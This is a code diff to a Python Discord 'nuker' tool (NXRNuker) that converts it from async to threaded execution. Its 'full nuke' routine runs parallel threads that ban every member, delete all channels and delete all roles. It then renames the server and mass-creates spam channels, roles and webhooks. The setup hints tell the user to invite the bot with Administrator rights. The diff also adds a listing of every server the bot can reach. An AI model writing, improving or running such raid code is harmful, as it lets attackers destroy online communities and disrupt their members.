-    await n.spam_channels(C("spam_channel_name"), C("spam_channel_amount"), 0, 3)
-    await n.spam_roles(C("spam_role_name"), C("spam_role_amount"), 0, 3)
-    await n.spam_webhooks(await n.fetch_channels(), C("spam_webhook_amount"), 3)
+    def _ban():
+        n.ban_all(members, reason, C("ban_delete_days"), conc)
+
+    def _chans():
+        n.delete_all_channels(chans, conc)
+
+    def _roles():
+        n.delete_all_roles(roles, conc)
+
+    threads = [threading.Thread(target=t) for t in (_ban, _chans, _roles)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+    n.rename_guild(C("guild_rename"))
+    n.spam_channels(C("spam_channel_name"), C("spam_channel_amount"), 0, 3)
+    n.spam_roles(C("spam_role_name"), C("spam_role_amount"), 0, 3)
+    n.spam_webhooks(n.fetch_channels(), C("spam_webhook_amount"), 3)
     log("DONE", "full nuke complete", C_OK)
 
 
@@ -840,11 +870,12 @@ ACTIONS = {
     "10": act_nick,
     "11": act_slowmode,
     "12": act_webhooks,
-    "13": act_full_nuke,
+    "13": act_list_guilds,
+    "14": act_full_nuke,
 }
 
 
-async def menu(n):
+def menu(n):
     while True:
         draw_menu()
         c = prompt("select", "0")
@@ -856,13 +887,13 @@ async def menu(n):
             log("ERR", "unknown option", C_ERR)
             continue
         try:
-            await fn(n)
+            fn(n)
         except Exception as e:
             log("ERR", f"{type(e).__name__}: {e}", C_ERR)
             traceback.print_exc()
 
 
-async def run():
+def run():
     clear()
     banner()
 
@@ -891,54 +922,55 @@ async def run():
 
     log("AUTH", "checking token...", C_WARN)
 
-    try:
-        async with aiohttp.ClientSession() as probe:
-            auth, label, result = await _probe_token(probe, cleaned)
+    auth, label, result = probe_token(cleaned)
 
-        if not auth:
-            log("ERR", "invalid token (401) in every format tried", C_ERR)
-            status = result.get("status") if isinstance(result, dict) else None
-            body = (result.get("body") if isinstance(result, dict) else "") or ""
-            if status == 401:
-                log("DETAIL", "Discord said 401 Unauthorized for Bot/raw/Bearer formats.", C_MUTED)
-                log("CAUSE", "token string itself is wrong (revoked, mistyped, or not a bot token).", C_WARN)
-                log("HINT", "dev portal > your app > Bot > Reset Token > Copy. paste that whole string.", C_WARN)
-                log("HINT", "paste with CTRL+SHIFT+V in the terminal to avoid formatting.", C_WARN)
-                log("HINT", "the token should be ~70 chars, THREE parts separated by dots.", C_WARN)
+    if not auth:
+        log("ERR", "invalid token (401) in every format tried", C_ERR)
+        status = result.get("status") if isinstance(result, dict) else None
+        if status == 401:
+            log("HINT", "dev portal > Bot > Reset Token > Copy. paste that whole string.", C_WARN)
+            log("HINT", "should be ~70 chars, three parts separated by dots.", C_WARN)
+        return
+
+    log("AUTH", f"format accepted: {label}", C_OK)
+    log("OK", f"logged in as {result.get('username','?')}#{result.get('discriminator','0')} (id {result.get('id','?')})", C_OK)
+
+    n = NXRNuker(auth, gid)
+
+    info = n.fetch_guild()
+    if "error" in info:
+        code = info.get("error")
+        if code == 403:
+            log("ERR", f"no access to guild {gid} (403)", C_ERR)
+            log("CAUSE", "the bot is NOT in this guild yet", C_WARN)
+            log("FIX", "invite the bot: dev portal > OAuth2 > URL Generator", C_WARN)
+            log("FIX", "scopes: bot + applications.commands | perms: Administrator", C_WARN)
+            log("FIX", "paste the generated URL in browser, pick your server, authorize", C_WARN)
+            print()
+            log("CHECK", "listing guilds the bot IS in...", C_WARN)
+            gs = n.my_guilds()
+            if gs:
+                print()
+                for g in gs:
+                    print(f"  {C_ACCENT}{g.get('id')}{RESET}  {g.get('name')}")
+                print()
+                log("HINT", "use one of the ids above next time", C_WARN)
             else:
-                log("DETAIL", f"status {status}: {body[:200]}", C_MUTED)
+                log("ERR", "bot is not in any guilds", C_ERR)
             return
+        if code == 404:
+            log("ERR", f"guild {gid} not found — wrong id or bot not invited", C_ERR)
+        else:
+            log("ERR", f"guild fetch failed: {code} {info.get('text','')[:120]}", C_ERR)
+        return
 
-        log("AUTH", f"format accepted: {label}", C_OK)
-        log("OK", f"logged in as {result.get('username','?')}#{result.get('discriminator','0')} (id {result.get('id','?')})", C_OK)
-
-        async with NXRNuker(auth, gid) as n:
-            info = await n.fetch_guild()
-            if "error" in info:
-                code = info.get("error")
-                if code == 404:
-                    log("ERR", f"guild {gid} not found — bot is not in it, or wrong id", C_ERR)
-                elif code == 403:
-                    log("ERR", f"no access to guild {gid} (403) — invite the bot first", C_ERR)
-                else:
-                    log("ERR", f"guild fetch failed: {code} {info.get('text','')[:120]}", C_ERR)
-                return
-
-            log("OK", f"{info['name']}  |  {info.get('approximate_member_count','?')} members", C_OK)
-            await menu(n)
-
-    except aiohttp.ClientConnectorError:
-        log("ERR", "network error — check your internet / dns", C_ERR)
-    except asyncio.TimeoutError:
-        log("ERR", "request timed out", C_ERR)
-    except Exception as e:
-        log("ERR", f"{type(e).__name__}: {e}", C_ERR)
-        traceback.print_exc()
+    log("OK", f"{info['name']}  |  {info.get('approximate_member_count','?')} members", C_OK)
+    menu(n)
 
 
 def main():
     try:
-        asyncio.run(run())
+        run()
     except KeyboardInterrupt:
         print(f"\n{C_ERR}aborted.{RESET}")
     except Exception:
